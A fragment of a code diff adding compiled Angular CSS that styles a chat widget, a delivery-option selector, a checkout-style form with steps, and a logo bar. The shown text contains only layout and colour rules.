+        border-top: 1px solid #000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] textarea[_ngcontent-xpb-c53] {
+        width: 100%;
+        height: 100%;
+        border: none;
+        border-radius: 0 0 10px 10px;
+        resize: none;
+        outline: none;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] button[_ngcontent-xpb-c53] {
+        width: 30px;
+        height: 30px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] {
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        align-content: stretch;
+        min-height: 100%;
+        height: 100%;
+        width: 100%;
+        background: #ffffff;
+        border-radius: 10px;
+        z-index: 10000;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] {
+        flex: 0 1 auto;
+        display: flex;
+        height: 50px;
+        background: rgba(52, 203, 40, 0.66);
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-chat-avatar[_ngcontent-xpb-c53] {
+        display: flex;
+        align-items: center;
+        margin-left: 20px;
+        margin-top: 5px;
+        margin-bottom: 5px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-avatar[_ngcontent-xpb-c53]
+        img[_ngcontent-xpb-c53] {
+        width: 40px;
+        height: 40px;
+        border-radius: 100%;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-chat-name[_ngcontent-xpb-c53] {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        margin-left: 10px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-name[_ngcontent-xpb-c53]
+        .name[_ngcontent-xpb-c53] {
+        font-size: 18px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-name[_ngcontent-xpb-c53]
+        .status[_ngcontent-xpb-c53] {
+        margin-left: 1px;
+        font-size: 12px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-close-btn[_ngcontent-xpb-c53] {
+        position: absolute;
+        right: 15px;
+        top: 12px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] {
+        flex: 1 1 auto;
+        overflow: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .ik-message-manager[_ngcontent-xpb-c53] {
+        display: table;
+        width: 100%;
+        padding: 5px 0;
+        animation: newMessageInvert 0.35s both ease-in-out;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53] {
+        padding: 0 60px 0 16px;
+        float: left;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .ik-message[_ngcontent-xpb-c53] {
+        position: relative;
+        color: #3d3d3d;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        border-radius: 20px;
+        padding: 8px 16px;
+        top: 0 !important;
+        font-size: 14px;
+        line-height: 20px;
+        word-break: break-word;
+        background-color: #8dd7e0;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .time[_ngcontent-xpb-c53] {
+        float: right;
+        text-align: right;
+        padding-left: 6px;
+        vertical-align: bottom;
+        font-size: 11px;
+        color: #b2b2b2;
+        padding-bottom: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        right: -40px;
+        top: -14px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .system[_ngcontent-xpb-c53] {
+        width: 100%;
+        text-align: center;
+        padding: 10px;
+        background: #79dd71;
+        margin-bottom: 20px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .ik-message-user[_ngcontent-xpb-c53] {
+        display: table;
+        width: 100%;
+        padding: 5px 0;
+        animation: newMessage 0.35s both ease-in-out;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53] {
+        padding: 0 16px 0 60px;
+        float: right;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .ik-message[_ngcontent-xpb-c53] {
+        background-color: #f1f0f0;
+        color: #3d3d3d;
+        border-radius: 20px;
+        background-clip: padding-box;
+        padding: 8px 16px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        font-size: 14px;
+        line-height: 20px;
+        word-break: break-word;
+        text-align: left;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .time[_ngcontent-xpb-c53] {
+        float: left;
+        text-align: right;
+        padding-right: 6px;
+        vertical-align: bottom;
+        font-size: 11px;
+        color: #b2b2b2;
+        padding-bottom: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        left: -40px;
+        top: -23px;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .lastMessage[_ngcontent-xpb-c53] {
+        animation: move 3s linear alternate;
+      }
+      @keyframes move {
+        0% {
+          top: 200px;
+        }
+        to {
+          top: 0px;
+        }
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] {
+        padding: 5px;
+        border-top: 1px solid #000;
+        flex: 0 1 auto;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] textarea[_ngcontent-xpb-c53] {
+        width: 100%;
+        height: 100%;
+        border: none;
+        border-radius: 0 0 10px 10px;
+        resize: none;
+        outline: none;
+      }
+      .ik-chat-w-mobile[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] button[_ngcontent-xpb-c53] {
+        width: 30px;
+        height: 30px;
+      }
+      .newMsgWind[_ngcontent-xpb-c53] {
+        position: fixed;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 10px;
+        bottom: 160px;
+        right: 0;
+        border-radius: 9px 0 0 9px;
+        background: #4d4dff;
+        cursor: pointer;
+        z-index: 100000;
+      }
+      .newMsgWind[_ngcontent-xpb-c53] .title[_ngcontent-xpb-c53] {
+        display: flex;
+      }
+      .newMsgWind[_ngcontent-xpb-c53] .title[_ngcontent-xpb-c53] mat-icon[_ngcontent-xpb-c53] {
+        color: #fff;
+      }
+      .newMsgWind[_ngcontent-xpb-c53] .title[_ngcontent-xpb-c53] p[_ngcontent-xpb-c53] {
+        color: #fff;
+        font-size: 18px;
+      }
+      .newMsgWind[_ngcontent-xpb-c53] p[_ngcontent-xpb-c53] {
+        max-width: 180px;
+        font-size: 12px;
+        color: #fff;
+      }
+      .ChatOpenBtnMobileSee[_ngcontent-xpb-c53] {
+        display: unset;
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        bottom: 160px;
+        right: 0;
+        height: 40px;
+        border-radius: 9px 0 0 9px;
+        background: #4d4dffb2;
+        overflow: hidden;
+        z-index: 50000;
+      }
+      .ChatOpenBtnMobileSee[_ngcontent-xpb-c53] button[_ngcontent-xpb-c53] {
+        width: 100%;
+      }
+      .ChatOpenBtnMobileSee[_ngcontent-xpb-c53] img[_ngcontent-xpb-c53] {
+        opacity: 0.5;
+      }
+      .file[_ngcontent-xpb-c53] {
+        display: none;
+      }
+    </style>
+    <style>
+      .logo[_ngcontent-xpb-c61] {
+        height: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #fff;
+        box-shadow: 0 -1px 4px #1a1a1a14, 0 4px 8px #1a1a1a1f;
+      }
+      .logo[_ngcontent-xpb-c61] img[_ngcontent-xpb-c61] {
+        height: 40px;
+      }
+      .logo[_ngcontent-xpb-c61] h1[_ngcontent-xpb-c61] {
+        display: none;
+        font-size: 16px;
+        font-weight: 500;
+      }
+      @media screen and (max-width: 750px) {
+        .logo[_ngcontent-xpb-c61] img[_ngcontent-xpb-c61] {
+          display: none;
+        }
+        .logo[_ngcontent-xpb-c61] h1[_ngcontent-xpb-c61] {
+          display: unset;
+        }
+      }
+    </style>
+    <style>
+      [_nghost-xpb-c85] {
+        font-family: Open Sans, sans-serif, Arial;
+      }
+      .lebonBggg[_ngcontent-xpb-c85] {
+        width: 100%;
+        position: fixed;
+        right: 0px;
+        bottom: 0px;
+        z-index: -5;
+        max-width: 740px;
+        height: 300px;
+        background-image: url(lebonBg.cf2607fbf4caf2dd.png);
+        background-size: cover;
+      }
+      .body[_ngcontent-xpb-c85] {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-family: Open Sans, sans-serif, Arial;
+      }
+      .body[_ngcontent-xpb-c85] .bgD[_ngcontent-xpb-c85] {
+        display: none;
+        position: absolute;
+        height: 100%;
+        width: 100%;
+        background: rgba(0, 0, 0, 0.25);
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .bgD[_ngcontent-xpb-c85] {
+          display: unset;
+        }
+      }
+      .body[_ngcontent-xpb-c85] .bgD[_ngcontent-xpb-c85] .selectMobileDelivry[_ngcontent-xpb-c85] {
+        transform: translate(0) !important;
+        position: fixed;
+        bottom: 0px;
+        background: #fff;
+        padding: 20px;
+        width: 100%;
+        border-radius: 20px 20px 0 0;
+      }
+      .body[_ngcontent-xpb-c85] .bgD[_ngcontent-xpb-c85] .selectMobileDelivry[_ngcontent-xpb-c85] .headerD[_ngcontent-xpb-c85] {
+        display: flex;
+        justify-content: space-between;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .headerD[_ngcontent-xpb-c85]
+        h1[_ngcontent-xpb-c85] {
+        font-size: 16px;
+        font-weight: 500;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .headerD[_ngcontent-xpb-c85]
+        svg[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        height: 15px;
+        width: 15px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85] {
+        padding: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .titleS[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 600;
+        font-size: 14px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        display: flex;
+        padding: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .a[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 20px;
+        height: 20px;
+        border-radius: 100%;
+        border: 1px solid #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .a[_ngcontent-xpb-c85]
+        .b[_ngcontent-xpb-c85] {
+        width: 10px;
+        height: 10px;
+        border-radius: 100%;
+        background: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .-s[_ngcontent-xpb-c85] {
+        width: 20px;
+        height: 20px;
+        border-radius: 100%;
+        border: 1px solid #acb7c3;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .-s[_ngcontent-xpb-c85]
+        .b[_ngcontent-xpb-c85] {
+        display: none;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85] {
+        display: flex;
+        flex-direction: column;
+        margin-left: 5px;
+        width: 100%;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        margin-right: 5px;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .ts[_ngcontent-xpb-c85] {
+        font-weight: 400;
+        line-height: 17px;
+        margin-top: 3px;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 14px;
+        font-weight: 600;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .selectD[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        .-ss[_ngcontent-xpb-c85] {
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .btnD[_ngcontent-xpb-c85]
+        button[_ngcontent-xpb-c85] {
+        width: 100%;
+        cursor: pointer;
+        padding: 10px;
+        border-radius: 4px;
+        border: unset;
+        color: #fff;
+        background: #4183d7;
+      }
+      .body[_ngcontent-xpb-c85]
+        .bgD[_ngcontent-xpb-c85]
+        .selectMobileDelivry[_ngcontent-xpb-c85]
+        .btnD[_ngcontent-xpb-c85]
+        button[_ngcontent-xpb-c85]:hover {
+        background: #2d5b93;
+      }
+      .body[_ngcontent-xpb-c85] .titleVV[_ngcontent-xpb-c85] {
+        width: 100%;
+        max-width: 1050px;
+        display: flex;
+        justify-content: left;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .titleVV[_ngcontent-xpb-c85] {
+          display: none;
+        }
+      }
+      .body[_ngcontent-xpb-c85] .titleVV[_ngcontent-xpb-c85] p[_ngcontent-xpb-c85] {
+        margin: 20px;
+        font-weight: 600;
+        font-size: 18px;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] {
+        display: flex;
+        justify-content: center;
+        width: 100%;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] {
+          margin-top: 20px;
+        }
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] {
+          flex-direction: column-reverse;
+          justify-content: unset;
+          padding: 0 20px;
+        }
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] {
+        width: 100%;
+        max-width: 700px;
+        margin-left: 10px;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] {
+          margin-left: unset;
+        }
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] .bg[_ngcontent-xpb-c85] {
+        background-color: #fff;
+        border-radius: 5px;
+        box-shadow: #1a1a1a14 0 -1px 4px, #1a1a1a1f 0 4px 8px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85] {
+        padding: 20px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .safe[_ngcontent-xpb-c85]
+        h1[_ngcontent-xpb-c85] {
+        margin-bottom: 20px;
+        font-weight: 600;
+        margin-top: 10px;
+        font-size: 18px;
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .safe[_ngcontent-xpb-c85]
+        h2[_ngcontent-xpb-c85] {
+        margin-bottom: 10px;
+        font-weight: 600;
+        margin-top: 10px;
+        font-size: 16px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .safe[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        line-height: 21px;
+        font-weight: 400;
+        margin-top: 5px;
+        font-size: 14px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .top[_ngcontent-xpb-c85] {
+        margin-bottom: 20px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .top[_ngcontent-xpb-c85]
+        h1[_ngcontent-xpb-c85] {
+        font-size: 16px;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .top[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        margin-top: 5px;
+        font-size: 12px;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .err[_ngcontent-xpb-c85] {
+        color: red;
+        font-size: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .inpDiv[_ngcontent-xpb-c85] {
+        height: 35px;
+        border: 1px solid #cad1d9;
+        border-radius: 4px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        label[_ngcontent-xpb-c85] {
+        font-weight: 600;
+        font-size: 14px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        input[_ngcontent-xpb-c85] {
+        width: 100%;
+        height: 100%;
+        border: none;
+        border-radius: 4px;
+        padding: 0 1rem;
+        font-size: 14px;
+        min-width: 0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .dbl[_ngcontent-xpb-c85] {
+        display: flex;
+        justify-content: space-between;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85]
+          .main[_ngcontent-xpb-c85]
+          .left[_ngcontent-xpb-c85]
+          .bg[_ngcontent-xpb-c85]
+          .alls[_ngcontent-xpb-c85]
+          .form[_ngcontent-xpb-c85]
+          .dbl[_ngcontent-xpb-c85] {
+          flex-direction: column;
+          justify-content: unset;
+        }
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .dbl[_ngcontent-xpb-c85]
+        .i1[_ngcontent-xpb-c85] {
+        width: 100%;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .dbl[_ngcontent-xpb-c85]
+        .i2[_ngcontent-xpb-c85] {
+        width: 100%;
+        margin-left: 5px;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85]
+          .main[_ngcontent-xpb-c85]
+          .left[_ngcontent-xpb-c85]
+          .bg[_ngcontent-xpb-c85]
+          .alls[_ngcontent-xpb-c85]
+          .form[_ngcontent-xpb-c85]
+          .dbl[_ngcontent-xpb-c85]
+          .i2[_ngcontent-xpb-c85] {
+          margin-left: unset;
+          margin-top: 10px;
+        }
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .address[_ngcontent-xpb-c85],
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .form[_ngcontent-xpb-c85]
+        .mt10[_ngcontent-xpb-c85] {
+        margin-top: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 600;
+        font-size: 16px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .sub[_ngcontent-xpb-c85] {
+        margin-top: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .sub[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 400;
+        font-size: 14px;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .step[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .step[_ngcontent-xpb-c85]
+        .num[_ngcontent-xpb-c85] {
+        height: 30px;
+        width: 30px;
+        display: flex;
+        border-radius: 100%;
+        justify-content: center;
+        align-items: center;
+        background-color: #fef0e9;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .step[_ngcontent-xpb-c85]
+        .num[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .step[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85] {
+        width: 90%;
+        margin-left: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .bg[_ngcontent-xpb-c85]
+        .alls[_ngcontent-xpb-c85]
+        .step[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 12px;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] .subText[_ngcontent-xpb-c85] {
+        margin-top: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .subText[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] .buttons[_ngcontent-xpb-c85] {
+        margin-top: 10px;
+        margin-bottom: 20px;
+      }
